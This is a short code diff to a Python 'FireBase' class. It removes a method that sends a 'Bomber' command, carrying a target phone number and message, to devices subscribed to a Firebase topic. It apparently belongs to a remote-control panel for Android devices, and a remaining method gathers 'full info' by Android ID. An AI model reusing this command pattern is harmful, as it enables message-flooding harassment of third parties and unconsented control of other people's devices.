@@ -95,19 +95,6 @@ class FireBase:
                 return False
         except Exception as Error:
             return Error
-    def __SendBomber__(self , Phone , Message):
-        try:
-            self.data = {
-                "data" : {"Action" : "Bomber" , "Phone" : str(Phone) , "Message" : str(Message)},
-                "to" : "/topics/{}".format(self.Topic),
-            }
-            self.Req = self.Session.post(self.Api , headers = self.Header , json = self.data)
-            if self.Req.json()["message_id"] != "":
-                return True
-            else:
-                return False
-        except Exception as Error:
-            return Error
     def __SendFullInfo__(self , androidid):
         try:
             self.data = {
